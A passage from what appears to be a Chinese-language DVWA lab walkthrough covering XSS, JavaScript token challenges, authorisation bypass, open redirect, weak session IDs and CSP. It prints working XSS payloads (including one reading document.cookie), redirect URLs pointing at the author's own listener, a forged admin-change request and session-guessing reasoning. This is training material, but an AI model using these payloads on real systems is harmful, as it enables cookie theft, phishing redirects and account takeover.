    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```
发现本题的name过滤有所变化，会将`<script>`完全过滤，那么我们就可以用事件触发器进行绕过类似于之前xss的绕过方式

---

## XSS（DOM）
### low
DOM：DOM（Document Object Model）即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。DOM提供了对整个文档的访问模型，将文档作为一个树形结构，树的每个结点表示了一个HTML标签或标签内的文本项。DOM树结构精确地描述了HTML文档中标签间的相互关联性。将HTML或XML文档转化为DOM树的过程称为解析(parse)。HTML文档被解析后，转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现。

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318191921.png)
可以发现url带有default参数，我们可以在这里执行js脚本指令

---

### Medium
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```
如果传入的的defult参数不为空，那么将会采用变量中的参数
然后继续判断default是否包含`<script>`，包含则丢弃
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250321103454.png)

我们可以用另一种方式绕过
```url
http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<img src=1 οnerrοr=alert(666)>
```
- **`<img src=1`**：这是一个 HTML `<img>` 标签的开始部分。`src` 属性应该是一个图片的 URL，但这里故意写成了 `1`，这是一个无效的图片地址。
    
- **`οnerrοr=alert(666)`**：`onerror` 是一个事件处理器属性，当图片加载失败时会触发。这里利用了 `onerror` 事件，在图片加载失败时执行 `alert(666)`，弹出一个警告框显示数字 `666`。
当前面的img标签的src路径出错时，会执行onerro的内容，也就达成了我们的目的
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250321103858.png)
发现标签被转义，并且标签没有正确闭合

换一条语句
```html
English</option></select><img src=1 onerror=alert(/xss/)>
```
注入成功
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250321111309.png)

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250321111525.png)
页面注入成功

---
### High
```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```
本题采用白名单验证，只允许白名单内的内容被上传
```html

default=#</option></select><BODY ONLOAD=alert(document.cookie)>
```
`#`之后的内容不会被传递到服务器，onellad
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250321135336.png)

注入成功

---
## JavaScript
### Low

提示输入success，但是提示错误

直接看源码,似乎先执行generate_token()，导致只会将ChangeMe的MD5
rot15内容写入id='token'
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318202718.png)
这里引入了外部库MD5哈希库

```js
!function(n){...}(this);
```
这是ROT13 编码函数
```js
function rot13(inp) {
    return inp.replace(/[a-zA-Z]/g,function(c){
        return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);
    });
}
```
生成Token的逻辑
```js
function generate_token() {
    var phrase = document.getElementById("phrase").value; //- 从页面中取 `id="phrase"` 的输入框的值（用户输入）。
    
    document.getElementById("token").value = md5(rot13(phrase));
    '''
    - 对输入值依次进行 **ROT13 编码** → **MD5 哈希**。
	- 将结果写入 `id="token"` 的输入框。
    '''
}
generate_token();
```
那么，我们先确保phrase为su运行generate_token();将其写入隐藏的id='token'输入框，之后再进行传参即可
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318203059.png)
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250318203206.png)

---
### Medium
```php
<?php
$page[ 'body' ] .= '<script src="' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/medium.js"></script>';
?>
```
medium.js
```php
function do_something(e)
{
      for(var t = "", n = e.length - 1; n >=0; n--)
            t += e[n];
      return t
}

setTimeout(function()
{
      do_elsesomething("XX")
},300);

function do_elsesomething(e)
{
      document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}

```
- `do_something(e) `:会将字符串反转
- `setTimeout(function()`:定义一个匿名函数，该函数将在指定的延迟后执行。该函数会在300毫秒后进行，并传入`do_elsesomething()`参数`"XX"`
- do_elsesomething(e)：会将e变量拼接phrase元素的值和XX，然后交给do_something进行翻转字符串
```
document.getElementById("phrase")会获取页面中id为phrase的元素，返回一个指向该属性的引用

```

![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322112318.png)
可以发现和上一个难度一样，并没有传递相应的success进行验证，也就是`XXsseccusXX`
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322112453.png)

---
### High
提供了混淆后的js代码
```
|   |
|---|
|```<br>var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S\|!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50\|!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q\|s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)\|Z.1N(s)\|s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y\|!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]\|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]\|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]\|=(2t\|(r>>6))<<U[i++&3];l[i>>2]\|=(R\|(r&V))<<U[i++&3]}z\x20p(r<2A\|r>=2E){l[i>>2]\|=(2D\|(r>>12))<<U[i++&3];l[i>>2]\|=(R\|((r>>6)&V))<<U[i++&3];l[i>>2]\|=(R\|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)\|(s.1Q(++M)&23));l[i>>2]\|=(2X\|(r>>18))<<U[i++&3];l[i>>2]\|=(R\|((r>>12)&V))<<U[i++&3];l[i>>2]\|=(R\|((r>>6)&V))<<U[i++&3];l[i>>2]\|=(R\|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]\|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3\|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)\|(v<<25))^((v>>>18)\|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)\|(v<<15))^((v>>>19)\|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)\|(a<<30))^((a>>>13)\|(a<<19))^((a>>>22)\|(a<<10));1b=((e>>>6)\|(e<<26))^((e>>>11)\|(e<<21))^((e>>>25)\|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)\|(d<<30))^((d>>>13)\|(d<<19))^((d>>>22)\|(d<<10));1b=((h>>>6)\|(h<<26))^((h>>>11)\|(h<<21))^((h>>>25)\|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)\|(c<<30))^((c>>>13)\|(c<<19))^((c>>>22)\|(c<<10));1b=((g>>>6)\|(g<<26))^((g>>>11)\|(g<<21))^((g>>>25)\|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)\|(b<<30))^((b>>>13)\|(b<<19))^((b>>>22)\|(b<<10));1b=((f>>>6)\|(f<<26))^((f>>>11)\|(f<<21))^((f>>>25)\|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t\|(r>>6));L[M++]=(R\|(r&V))}z\x20p(r<2A\|r>=2E){L[M++]=(2D\|(r>>12));L[M++]=(R\|((r>>6)&V));L[M++]=(R\|(r&V))}z{r=2C+(((r&23)<<10)\|(G.1Q(++i)&23));L[M++]=(2X\|(r>>18));L[M++]=(R\|((r>>12)&V));L[M++]=(R\|((r>>6)&V));L[M++]=(R\|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y\|!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]\|0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','\|this\|blocks\|HEX_CHARS\|0x0F\|if\|var\|code\|message\|0xFF\|t1\|function\|is224\|else\|return\|h1\|h0\|h7\|h2\|h3\|key\|h6\|h5\|h4\|bytes\|index\|Sha256\|new\|method\|prototype\|0x80\|update\|type\|SHIFT\|0x3f\|length\|exports\|root\|ArrayBuffer\|s0\|s1\|typeof\|true\|hex\|t2\|for\|ch\|dataView\|maj\|64\|ERROR\|document\|object\|getElementById\|setUint32\|sha256\|value\|finalize\|Error\|throw\|sharedMemory\|buffer\|obj\|ARRAY_BUFFER\|Array\|start\|ab\|block\|bc\|OUTPUT_TYPES\|oKeyPad\|digest\|sha224\|call\|constructor\|isArray\|hashed\|token\|isView\|false\|HmacSha256\|charCodeAt\|WINDOW\|crypto\|create\|finalized\|cd\|hash\|outputType\|Buffer\|da\|0x3ff\|array\|createMethod\|arr\|inner\|process\|iKeyPad\|createHmacMethod\|module\|notString\|hBytes\|first\|createHmacOutputMethod\|define\|createOutputMethod\|algorithm\|NODE_JS\|string\|null\|Uint8Array\|AMD\|0xc0\|lastByteIndex\|0x800\|EXTRA\|createHash\|do_something\|nodeMethod\|0xd800\|token_part_2\|0x10000\|0xe0\|0xe000\|phrase\|COMMON_JS\|4294967296\|window\|token_part_3\|token_part_1\|WEB_WORKER\|self\|require\|eval\|nodeWrap\|versions\|arrayBuffer\|JS_SHA256_NO_NODE_JS\|undefined\|toString\|hmac\|innerHash\|0xf0\|0xa2bfe8a1\|0xc24b8b70\|0xa81a664b\|0x92722c85\|0x81c2c92e\|0xc76c51a3\|0x53380d13\|0x766a0abb\|0x4d2c6dfc\|0x650a7354\|0x748f82ee\|0x84c87814\|0x78a5636f\|0x682e6ff3\|0x8cc70208\|0x2e1b2138\|0xa4506ceb\|0x90befffa\|0xbef9a3f7\|0x5b9cca4f\|0x4ed8aa4a\|0x106aa070\|0xf40e3585\|0xd6990624\|0x19a4c116\|0x1e376c08\|0x391c0cb3\|0x34b0bcb5\|0x2748774c\|0xd192e819\|0x0fc19dc6\|32768\|128\|8388608\|2147483648\|split\|0x428a2f98\|0x71374491\|0x59f111f1\|0x3956c25b\|0xe9b5dba5\|0xb5c0fbcf\|0123456789abcdef\|JS_SHA256_NO_ARRAY_BUFFER\|is\|invalid\|input\|strict\|use\|JS_SHA256_NO_WINDOW\|ABCD\|amd\|JS_SHA256_NO_COMMON_JS\|global\|node\|0x923f82a4\|0xab1c5ed5\|0x983e5152\|0xa831c66d\|0x76f988da\|0x5cb0a9dc\|0x4a7484aa\|0xb00327c8\|0xbf597fc7\|0x14292967\|0x06ca6351\|0xd5a79147\|0xc6e00bf3\|0x2de92c6f\|0x240ca1cc\|0x550c7dc3\|0x72be5d74\|0x243185be\|0x12835b01\|0xd807aa98\|0x80deb1fe\|0x9bdc06a7\|0xc67178f2\|0xefbe4786\|0xe49b69c1\|0xc19bf174\|0x27b70a85\|0x3070dd17\|300032\|1413257819\|150054599\|24177077\|56\|4294967295\|0x5be0cd19\|while\|setTimeout\|704751109\|210244248\|DataView\|0x36\|0x5c\|push\|ZZ\|Object\|143694565\|YY\|0x1f83d9ab\|1521486534\|0x367cd507\|0xc1059ed8\|0xffc00b31\|0x68581511\|0x64f98fa7\|XX\|300\|0x9b05688c\|send\|addEventListener\|click\|utf8\|0xbefa4fa4\|0xf70e5939\|0x510e527f\|0xbb67ae85\|0x6a09e667\|0x3c6ef372\|0xa54ff53a\|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]\|h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]\|k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\x5cb'+h(f)+'\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('\|'),0x0,{}));<br>```|
```
有一个反混淆工具网站
[Deobfuscate Javascript - Deobfuscate malicious Javascripts for quick and easy analysis](http://deobfuscatejavascript.com/#)

```js
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

关键的部分
- `document.getElementById("phrase").value = "";`:清除phrase值的内容
- `setTimeout(function() {`:会在300毫秒后，传入XX
查看`document.getElementById("token").value = sha256(e + document.getElementById("token").value)`:设置token为加密后的新值为XXsuccess的sha256值
`document.getElementById("send").addEventListener("click", token_part_3);`:会监听send事件被触发，在监听到事件时会执行token_part_3,
查看`function token_part_3(t, y = "ZZ") {`:会将token拼接ZZ并且用sha256然后赋值给token
注意到token_part2会在send事件执行之前被触发，也就是并不会改变
`token_part_1("ABCD", 44);`:意味着会将phrase传给token
我们需要调整一下攻击顺序
![](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322131113.png)
注意要在输入框中输入success再在控制台执行命令


---
## Authorisation Bypass
**授权绕过**（Authorisation Bypass）是一种严重的安全，通过利用系统的或错误配置，绕过正常的访问控制机制，获得未经授权的访问权限。这种可能导致敏感信息泄露、数据篡改、系统破坏等严重后果
### Low
先记住这个界面的url
```url
http://192.168.254.128/DVWA/vulnerabilities/authbypass/
```
切换普通用户
发现没有那一行了
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319100848.png)
访问之前复制的url
成功绕过
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250319100955.png)

---
### Medium
```php
<?php
/*

Only the admin user is allowed to access this page.

Have a look at these two files for possible vulnerabilities: 

* vulnerabilities/authbypass/get_user_data.php
* vulnerabilities/authbypass/change_user_details.php

*/

if (dvwaCurrentUser() != "admin") {
    print "Unauthorised";
    http_response_code(403);
    exit;
}
?>


```

![](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322132647.png)
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322133038.png)


---
### High
```url
http://192.168.254.128/DVWA/vulnerabilities/authbypass/change_user_details.php
```
这个url可以为本关的入口
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322135917.png)

提示用POST方法上传


用POST后提示缺少字段
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322140034.png)
构造字段
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322140336.png)
```json
{
"id":"1",
"firstname":"admin",
"surname":"admin"
}
```

---
## Open HTTP Redirect
### Low
先看代码
```php
<?php

if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
    header ("location: " . $_GET['redirect']);
    exit;
}

http_response_code (500);
?>
<p>Missing redirect target.</p>
<?php
exit;
?>
```
本题先if判断
```php
if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
```
- 判断redirect键是否存在且不为空


```php
header ("location: " . $_GET['redirect']);
```
- **`header()`**：这是PHP的一个函数，用于发送原始HTTP头信息。在这里，它用于发送一个HTTP头，告诉浏览器进行页面跳转。
- **`"location: " . $_GET['redirect']`**：设置HTTP头的`Location`字段，其值为`$_GET['redirect']`的值。
```url
192.168.254.128/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=
```
构造这样的url，之后的redirect传入网址即可进行任意网站访问
例如开启之前xss的服务器脚本
构造payload
```url
192.168.254.128/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=http://192.168.1.21:7989/
```

---
### Medium
本关相较于上一关增加了对于http的过滤
#### URL的特性
在没有显性的协议时会使用本页面的协议
列如`http://192.168.1.21:7989/`可以写成`//192.168.1.21:7989`
payload
```url
192.168.254.128/DVWA/vulnerabilities/open_redirect/source/medium.php?redirect=//192.168.1.21:7989
```
---
### High
```php
<?php

if (array_key_exists ("redirect", $_GET) && $_GET['redirect'] != "") {
    if (strpos($_GET['redirect'], "info.php") !== false) {
        header ("location: " . $_GET['redirect']);
        exit;
    } else {
        http_response_code (500);
        ?>
        <p>You can only redirect to the info page.</p>
        <?php
        exit;
    }
}

http_response_code (500);
?>
<p>Missing redirect target.</p>
<?php
exit;
?>
```
会检查是否存在redirect字段，然后检查redirect字段中是否存在info.php，如果不存在则响应状态为500
这很好操作，我们可以随便传一个参数，在传送到服务器时，会检测通过，

```url
192.168.254.128/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=http://192.168.1.21:7989/?6=info.php
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250322144529.png)
成功

---
## Weak Session IDS
### low
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id'])) {
        $_SESSION['last_session_id'] = 0;
    }
    $_SESSION['last_session_id']++;
    $cookie_value = $_SESSION['last_session_id'];
    setcookie("dvwaSession", $cookie_value);
}
?>
```

每当post被触发时源码中会获取现在的session，然后会+1
我们就可以进行，没错，我们在清除浏览器缓存后，用这个session进行越权登录

---
### Mddium
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $cookie_value = time();
    setcookie("dvwaSession", $cookie_value);
}
?>
```
这个会将时间戳连接到cookie值

---
### High
```php
<?php

$html = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (!isset ($_SESSION['last_session_id_high'])) {
        $_SESSION['last_session_id_high'] = 0;
    }
    $_SESSION['last_session_id_high']++;
    $cookie_value = md5($_SESSION['last_session_id_high']);
    setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
}

?>
```
这个会将内容进行md5加密

---
## CSP Bypass
CSP 提供了一系列的指令和选项，用于配置安全策略，例如：

default-src 指令：指定默认情况下允许加载的资源来源。
script-src 指令：用于限制可执行脚本的来源。
style-src 指令：用于限制可应用的样式表的来源。
img-src 指令：用于限制可加载的图像的来源。
connect-src 指令：用于限制可建立网络连接的来源。
font-src 指令：用于限制可加载的字体文件的来源。
frame-src 指令：用于限制可以嵌入页面的框架的来源。
report-uri 指令：指定将安全违规报告发送到的 URL

---
### Low
```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja ;"; // allows js from self, pastebin.com, hastebin.com, jquery, digi.ninja, and google analytics.

header($headerCSP);

